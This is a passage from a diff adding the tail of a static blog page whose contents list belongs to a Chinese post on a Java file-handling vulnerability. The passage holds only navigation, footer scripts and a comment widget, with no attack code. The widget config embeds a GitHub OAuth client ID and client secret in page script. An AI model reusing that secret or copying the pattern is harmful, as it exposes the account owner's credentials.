class="nav-number">1.9.1.</span> <span class="nav-text">3.1. 环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-原理分析"><span class="nav-number">1.9.2.</span> <span class="nav-text">3.2. 原理分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-调试代码"><span class="nav-number">1.9.3.</span> <span class="nav-text">3.3. 调试代码</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#FileOutputStream-特性"><span class="nav-number">1.9.3.1.</span> <span class="nav-text">FileOutputStream 特性</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#java-io-File-的特性"><span class="nav-number">1.9.3.2.</span> <span class="nav-text">java.io.File 的特性</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-4-漏洞复现"><span class="nav-number">1.9.4.</span> <span class="nav-text">3.4. 漏洞复现</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-漏洞分析总结"><span class="nav-number">1.10.</span> <span class="nav-text">4. 漏洞分析总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-如何检测漏洞？"><span class="nav-number">1.11.</span> <span class="nav-text">5. 如何检测漏洞？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-如何应对漏洞？"><span class="nav-number">1.12.</span> <span class="nav-text">6. 如何应对漏洞？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-Web安全最佳实践"><span class="nav-number">1.13.</span> <span class="nav-text">7. Web安全最佳实践</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">21:52</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
